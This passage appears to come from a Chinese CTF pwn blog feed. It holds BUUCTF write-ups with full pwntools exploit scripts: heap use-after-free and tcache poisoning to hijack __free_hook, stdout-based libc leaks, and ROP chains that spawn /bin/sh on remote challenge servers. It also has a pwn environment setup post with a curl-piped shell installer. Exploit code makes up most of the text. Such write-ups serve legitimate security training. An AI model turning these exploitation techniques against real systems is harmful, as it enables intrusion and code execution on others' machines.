class="string">&quot;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&quot;</span>)</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>X86:<a href="https://introspelliam.github.io/2017/09/30/pwn/%E5%85%A8%E6%98%AF%E5%8F%AF%E8%A7%81%E5%AD%97%E7%AC%A6%E7%9A%84shellcode/">https://introspelliam.github.io/2017/09/30/pwn/%E5%85%A8%E6%98%AF%E5%8F%AF%E8%A7%81%E5%AD%97%E7%AC%A6%E7%9A%84shellcode/</a></p><h2 id="roarctf-2019-realloc-magic"><a href="#roarctf-2019-realloc-magic" class="headerlink" title="roarctf_2019_realloc_magic"></a>roarctf_2019_realloc_magic</h2><p>（难）考点：</p><ul><li>realloc函数的特性</li><li>堆布局</li><li>2.27下的IO泄露地址</li></ul><p>总结：没有edit可以通过连续的free函数做uaf；由于不检查size，在只有heapptr的时候可以realloc(0)后构造overlap，覆盖victim的size，这样的效果可以使得逐个清空某个size大小的tcache bin，最终申请到freehook；泄露io直接申请到stdout的地方改writebase为0x58泄露IO-file-jumps的地址；爆破注意模板</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    dbg()</span><br><span class="line">    add(<span class="number">0x60</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">0</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    add(<span class="number">0xa0</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">0</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x10</span>, <span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">    add(<span class="number">0</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    add(<span class="number">0xa0</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        free()</span><br><span class="line">    add(<span class="number">0</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x60</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    payload = <span class="number">0x60</span> * <span class="string">&#x27;a&#x27;</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x41</span>) + p8(<span class="number">0x60</span>) + p8(<span class="number">0x97</span>)</span><br><span class="line">    add(<span class="number">0x110</span>, payload)</span><br><span class="line">    add(<span class="number">0</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0xa0</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    add(<span class="number">0</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    add(<span class="number">0xa0</span>, p64(<span class="number">0xfbad1887</span>) + p64(<span class="number">0</span>) * <span class="number">3</span> + p8(<span class="number">0x58</span>))</span><br><span class="line">    leak = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>,timeout=<span class="number">0.1</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)) - libc.sym[<span class="string">&quot;_IO_file_jumps&quot;</span>]</span><br><span class="line">    echo(<span class="string">&quot;leak:&quot;</span> + <span class="built_in">hex</span>(leak))</span><br><span class="line">    <span class="keyword">if</span> leak == -libc.sym[<span class="string">&quot;_IO_file_jumps&quot;</span>]:</span><br><span class="line">        exit(-<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">    backdoor()</span><br><span class="line">    __free_hook = leak + libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">    add(<span class="number">0x30</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    free()</span><br><span class="line">    add(<span class="number">0</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x110</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x68</span> + p64(<span class="number">0x51</span>) + p64(__free_hook - <span class="number">8</span>))</span><br><span class="line">    add(<span class="number">0</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x30</span>, p8((__free_hook - <span class="number">8</span>) &amp; <span class="number">0xff</span>))</span><br><span class="line">    add(<span class="number">0</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x30</span>, <span class="string">&#x27;/bin/sh\x00&#x27;</span> + p64(leak + libc.sym[<span class="string">&quot;system&quot;</span>]))</span><br><span class="line">    <span class="comment"># free()</span></span><br><span class="line">    gdba()</span><br><span class="line">    ia()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="comment"># io = process(challenge,env = &#123;&quot;LD_PRELOAD&quot;:libc_path_local&#125;)</span></span><br><span class="line">        io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">29747</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            exp()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            io.close()</span><br><span class="line">            <span class="keyword">continue</span></span><br></pre></td></tr></table></figure><h2 id="强网杯2019-拟态-STKOF"><a href="#强网杯2019-拟态-STKOF" class="headerlink" title="强网杯2019 拟态 STKOF"></a>强网杯2019 拟态 STKOF</h2><p>（较易）考点</p><ul><li>栈溢出</li><li>静态编译</li></ul><p>ROPgadget生成的ropchain长度超了，ropper可以</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line"></span><br><span class="line">    p = <span class="keyword">lambda</span> x : pack(<span class="string">&#x27;Q&#x27;</span>, x)</span><br><span class="line"></span><br><span class="line">    IMAGE_BASE_0 = <span class="number">0x0000000000400000</span> <span class="comment"># 40e64f05032527bd1aaaaf05161090bf0ee2f31afe5144cf358725e178579b73</span></span><br><span class="line">    rebase_0 = <span class="keyword">lambda</span> x : p(x + IMAGE_BASE_0)</span><br><span class="line"></span><br><span class="line">    rop = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    rop += rebase_0(<span class="number">0x0000000000001d0d</span>) <span class="comment"># 0x0000000000401d0d: pop r13; ret; </span></span><br><span class="line">    rop += <span class="string">&#x27;//bin/sh&#x27;</span></span><br><span class="line">    rop += rebase_0(<span class="number">0x00000000000005f6</span>) <span class="comment"># 0x00000000004005f6: pop rdi; ret; </span></span><br><span class="line">    rop += rebase_0(<span class="number">0x00000000002a10e0</span>)</span><br><span class="line">    rop += rebase_0(<span class="number">0x0000000000055ec9</span>) <span class="comment"># 0x0000000000455ec9: mov qword ptr [rdi], r13; pop rbx; pop rbp; pop r12; pop r13; ret; </span></span><br><span class="line">    rop += p(<span class="number">0xdeadbeefdeadbeef</span>)</span><br><span class="line">    rop += p(<span class="number">0xdeadbeefdeadbeef</span>)</span><br><span class="line">    rop += p(<span class="number">0xdeadbeefdeadbeef</span>)</span><br><span class="line">    rop += p(<span class="number">0xdeadbeefdeadbeef</span>)</span><br><span class="line">    rop += rebase_0(<span class="number">0x0000000000001d0d</span>) <span class="comment"># 0x0000000000401d0d: pop r13; ret; </span></span><br><span class="line">    rop += p(<span class="number">0x0000000000000000</span>)</span><br><span class="line">    rop += rebase_0(<span class="number">0x00000000000005f6</span>) <span class="comment"># 0x00000000004005f6: pop rdi; ret; </span></span><br><span class="line">    rop += rebase_0(<span class="number">0x00000000002a10e8</span>)</span><br><span class="line">    rop += rebase_0(<span class="number">0x0000000000055ec9</span>) <span class="comment"># 0x0000000000455ec9: mov qword ptr [rdi], r13; pop rbx; pop rbp; pop r12; pop r13; ret; </span></span><br><span class="line">    rop += p(<span class="number">0xdeadbeefdeadbeef</span>)</span><br><span class="line">    rop += p(<span class="number">0xdeadbeefdeadbeef</span>)</span><br><span class="line">    rop += p(<span class="number">0xdeadbeefdeadbeef</span>)</span><br><span class="line">    rop += p(<span class="number">0xdeadbeefdeadbeef</span>)</span><br><span class="line">    rop += rebase_0(<span class="number">0x00000000000005f6</span>) <span class="comment"># 0x00000000004005f6: pop rdi; ret; </span></span><br><span class="line">    rop += rebase_0(<span class="number">0x00000000002a10e0</span>)</span><br><span class="line">    rop += rebase_0(<span class="number">0x0000000000005895</span>) <span class="comment"># 0x0000000000405895: pop rsi; ret; </span></span><br><span class="line">    rop += rebase_0(<span class="number">0x00000000002a10e8</span>)</span><br><span class="line">    rop += rebase_0(<span class="number">0x000000000003d9d5</span>) <span class="comment"># 0x000000000043d9d5: pop rdx; ret; </span></span><br><span class="line">    rop += rebase_0(<span class="number">0x00000000002a10e8</span>)</span><br><span class="line">    rop += rebase_0(<span class="number">0x000000000003b97c</span>) <span class="comment"># 0x000000000043b97c: pop rax; ret; </span></span><br><span class="line">    rop += p(<span class="number">0x000000000000003b</span>)</span><br><span class="line">    rop += rebase_0(<span class="number">0x0000000000061645</span>) <span class="comment"># 0x0000000000461645: syscall; ret; </span></span><br><span class="line">    <span class="built_in">print</span> rop</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x118</span></span><br><span class="line">    payload += rop</span><br><span class="line"></span><br><span class="line">    echo(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line">    ru(<span class="string">&quot;We give you a little challenge, try to pwn it?&quot;</span>)</span><br><span class="line">    sd(payload)</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h2 id="ciscn-2019-final-5"><a href="#ciscn-2019-final-5" class="headerlink" title="ciscn_2019_final_5"></a>ciscn_2019_final_5</h2>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> buuctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn环境搭建</title>
      <link href="2021/08/01/pwn%E7%8E%AF%E5%A2%83/"/>
      <url>2021/08/01/pwn%E7%8E%AF%E5%A2%83/</url>
      
        <content type="html"><![CDATA[<p>由于误操作把镜像扬了<br>md<br>重新搭建环境</p><h2 id="docker镜像下载"><a href="#docker镜像下载" class="headerlink" title="docker镜像下载"></a>docker镜像下载</h2><p>pwndocker没啥好说的<br>run起来<br><code>docker run -d --rm -h mypwn --name mypwn -v $(pwd):/ctf/work -p 23946:23946  --cap-add=SYS_PTRACE pwn</code><br>进bash<br><code>docker exec -it 2bc6d921117349347c72ebcbfe0f655b33d520f8e6562d1ec6e5f1b8b97f4a51 bash</code></p><h2 id="oh-my-zsh下载配置"><a href="#oh-my-zsh下载配置" class="headerlink" title="oh-my-zsh下载配置"></a>oh-my-zsh下载配置</h2><p>先安装zsh，apt install即可<br>然后安装oh-my-zsh<br><code>sh -c &quot;$(curl -fsSL https://cdn.devland.cn/shell/ohmyzsh.sh)&quot;</code></p><p>主题我选steeef，之前一直是ys，换个口味2333</p><h3 id="zsh-autosuggestions"><a href="#zsh-autosuggestions" class="headerlink" title="zsh-autosuggestions"></a>zsh-autosuggestions</h3><p>命令补全<br><code>git clone https://github.com.cnpmjs.org/zsh-users/zsh-autosuggestions $&#123;ZSH_CUSTOM:-~/.oh-my-zsh/custom&#125;/plugins/zsh-autosuggestions</code></p><h3 id="zsh-syntax-highlighting"><a href="#zsh-syntax-highlighting" class="headerlink" title="zsh-syntax-highlighting"></a>zsh-syntax-highlighting</h3><p>命令高亮提示<br><code>git clone https://github.com.cnpmjs.org//zsh-users/zsh-syntax-highlighting.git $&#123;ZSH_CUSTOM:-~/.oh-my-zsh/custom&#125;/plugins/zsh-syntax-highlighting</code></p><h3 id="配置文件插件部分"><a href="#配置文件插件部分" class="headerlink" title="配置文件插件部分"></a>配置文件插件部分</h3><p><code>plugins=(git zsh-syntax-highlighting zsh-autosuggestions z)</code></p><h2 id="glbc"><a href="#glbc" class="headerlink" title="glbc"></a>glbc</h2><p>通过之前pwn_debug编译的libc+source来配合调试程序</p><h2 id="tmux"><a href="#tmux" class="headerlink" title="tmux"></a>tmux</h2><p>tmux配置文件改了改<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> -g prefix `<span class="comment">#</span></span><br><span class="line">unbind C-b <span class="comment"># C-b即Ctrl+b键，unbind意味着解除绑定</span></span><br><span class="line"><span class="built_in">bind</span> ` send-prefix <span class="comment"># 绑定Ctrl+a为新的指令前缀</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">bind</span> r source-file ~/.tmux.conf \; display-message <span class="string">&quot;Config reloaded..&quot;</span></span><br><span class="line"></span><br><span class="line">unbind <span class="string">&#x27;&quot;&#x27;</span></span><br><span class="line"><span class="built_in">bind</span> - splitw -v -c <span class="string">&#x27;#&#123;pane_current_path&#125;&#x27;</span> <span class="comment"># 垂直方向新增面板，默认进入当前目录</span></span><br><span class="line">unbind %</span><br><span class="line"><span class="built_in">bind</span> | splitw -h -c <span class="string">&#x27;#&#123;pane_current_path&#125;&#x27;</span> <span class="comment"># 水平方向新增面板，默认进入当前目录</span></span><br><span class="line"></span><br><span class="line">set-option -g mouse on <span class="comment"># 等同于以上4个指令的效果</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 绑定hjkl键为面板切换的上下左右键</span></span><br><span class="line"><span class="built_in">bind</span> -r k select-pane -U <span class="comment"># 绑定k为↑</span></span><br><span class="line"><span class="built_in">bind</span> -r j select-pane -D <span class="comment"># 绑定j为↓</span></span><br><span class="line"><span class="built_in">bind</span> -r h select-pane -L <span class="comment"># 绑定h为←</span></span><br><span class="line"><span class="built_in">bind</span> -r l select-pane -R <span class="comment"># 绑定l为→</span></span><br></pre></td></tr></table></figure></p><p>彳亍，目前就这么多，可能还有没想起来的再另说</p>]]></content>
      
      
      
        <tags>
            
            <tag> pwn环境搭建 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF第一周</title>
      <link href="2021/07/28/BUUCTF/"/>
      <url>2021/07/28/BUUCTF/</url>
      
        <content type="html"><![CDATA[<p>从一分题开始向后推</p><h2 id="cmcc-pwnme2"><a href="#cmcc-pwnme2" class="headerlink" title="cmcc_pwnme2"></a>cmcc_pwnme2</h2><p>（易）考点：</p><ul><li>栈溢出</li><li>函数调用</li></ul><p>32位程序，有伪后门，构造bss段string调用后门</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">arch =  <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&quot;./pwnme2&quot;</span></span><br><span class="line"><span class="comment"># libc_path = &#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">echo</span>(<span class="params">content</span>):</span></span><br><span class="line">    print(<span class="string">&quot;\033[4;36;40mOutput prompts:\033[0m&quot;</span> + <span class="string">&quot;\t\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + content + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    ru(<span class="string">&quot;Please input:&quot;</span>)</span><br><span class="line">    pop_ret = <span class="number">0x08048409</span></span><br><span class="line">    payload = (<span class="number">0x6c</span> + <span class="number">0x4</span>) * <span class="string">b&#x27;a&#x27;</span> + p32(elf.plt[<span class="string">&quot;gets&quot;</span>]) + p32(pop_ret) + p32(<span class="number">0x0804A060</span>) + p32(<span class="number">0x80485CB</span>)</span><br><span class="line">    sl(payload)</span><br><span class="line">    sl(<span class="string">&quot;/flag&quot;</span>)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">local = <span class="built_in">int</span>(sys.argv[<span class="number">1</span>])</span><br><span class="line">elf = ELF(challenge)</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(challenge)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">27788</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> arch == <span class="number">64</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">elif</span> arch == <span class="number">32</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">p   = <span class="keyword">lambda</span>      : pause() </span><br><span class="line">s   = <span class="keyword">lambda</span> x    : success(x)</span><br><span class="line">re  = <span class="keyword">lambda</span> m, t : io.recv(numb=m, timeout=t)</span><br><span class="line">ru  = <span class="keyword">lambda</span> x    : io.recvuntil(x)</span><br><span class="line">rl  = <span class="keyword">lambda</span>      : io.recvline()</span><br><span class="line">sd  = <span class="keyword">lambda</span> x    : io.send(x)</span><br><span class="line">sl  = <span class="keyword">lambda</span> x    : io.sendline(x)</span><br><span class="line">ia  = <span class="keyword">lambda</span>      : io.interactive()</span><br><span class="line">sla = <span class="keyword">lambda</span> a, b : io.sendlineafter(a, b)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a, b : io.sendafter(a, b)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">bps = []</span><br><span class="line">pie = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gdba</span>():</span></span><br><span class="line">    <span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    cmd =<span class="string">&#x27;set follow-fork-mode parent\n&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> pie:</span><br><span class="line">        base = <span class="built_in">int</span>(os.popen(<span class="string">&quot;pmap &#123;&#125;|awk &#x27;&#123;&#123;print ./pwnme2&#125;&#125;&#x27;&quot;</span>.<span class="built_in">format</span>(io.pid)).readlines()[<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line">        cmd +=<span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(b+base) <span class="keyword">for</span> b <span class="keyword">in</span> bps])</span><br><span class="line">        cmd +=<span class="string">&#x27;set base=&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(base)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        cmd+=<span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(b) <span class="keyword">for</span> b <span class="keyword">in</span> bps])</span><br><span class="line">    gdb.attach(io,cmd)</span><br><span class="line"></span><br><span class="line">exp()</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure><h2 id="picoctf-2018-can-you-gets-me"><a href="#picoctf-2018-can-you-gets-me" class="headerlink" title="picoctf_2018_can_you_gets_me"></a>picoctf_2018_can_you_gets_me</h2><p>（易）考点：</p><ul><li>栈溢出</li><li>静态编译</li></ul><p>ropchain一把梭</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"></span><br><span class="line">arch =  <span class="number">32</span></span><br><span class="line">challenge = <span class="string">&quot;./PicoCTF_2018_can-you-gets-me&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">echo</span>(<span class="params">content</span>):</span></span><br><span class="line">    print(<span class="string">&quot;\033[4;36;40mOutput prompts:\033[0m&quot;</span> + <span class="string">&quot;\t\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + content + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    p = <span class="number">0x1c</span> * <span class="string">b&#x27;a&#x27;</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806f02a</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080b81c6</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">    p += <span class="string">b&#x27;/bin&#x27;</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080549db</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806f02a</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea064</span>) <span class="comment"># @ .data + 4</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080b81c6</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">    p += <span class="string">b&#x27;//sh&#x27;</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080549db</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806f02a</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x08049303</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080549db</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080481c9</span>) <span class="comment"># pop ebx ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080de955</span>) <span class="comment"># pop ecx ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806f02a</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x08049303</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806cc25</span>) <span class="comment"># int 0x80</span></span><br><span class="line">    sl(p)</span><br><span class="line"></span><br><span class="line">local = <span class="built_in">int</span>(sys.argv[<span class="number">1</span>])</span><br><span class="line">elf = ELF(challenge)</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(challenge)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">28408</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> arch == <span class="number">64</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">elif</span> arch == <span class="number">32</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">pau   = <span class="keyword">lambda</span>      : pause() </span><br><span class="line">s   = <span class="keyword">lambda</span> x    : success(x)</span><br><span class="line">re  = <span class="keyword">lambda</span> m, t : io.recv(numb=m, timeout=t)</span><br><span class="line">ru  = <span class="keyword">lambda</span> x    : io.recvuntil(x)</span><br><span class="line">rl  = <span class="keyword">lambda</span>      : io.recvline()</span><br><span class="line">sd  = <span class="keyword">lambda</span> x    : io.send(x)</span><br><span class="line">sl  = <span class="keyword">lambda</span> x    : io.sendline(x)</span><br><span class="line">ia  = <span class="keyword">lambda</span>      : io.interactive()</span><br><span class="line">sla = <span class="keyword">lambda</span> a, b : io.sendlineafter(a, b)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a, b : io.sendafter(a, b)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">bps = []</span><br><span class="line">pie = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gdba</span>():</span></span><br><span class="line">    <span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    cmd =<span class="string">&#x27;set follow-fork-mode parent\n&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> pie:</span><br><span class="line">        base = <span class="built_in">int</span>(os.popen(<span class="string">&quot;pmap &#123;&#125;|awk &#x27;&#123;&#123;print &#125;&#125;&#x27;&quot;</span>.<span class="built_in">format</span>(io.pid)).readlines()[<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line">        cmd +=<span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(b+base) <span class="keyword">for</span> b <span class="keyword">in</span> bps])</span><br><span class="line">        cmd +=<span class="string">&#x27;set base=&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(base)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        cmd+=<span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(b) <span 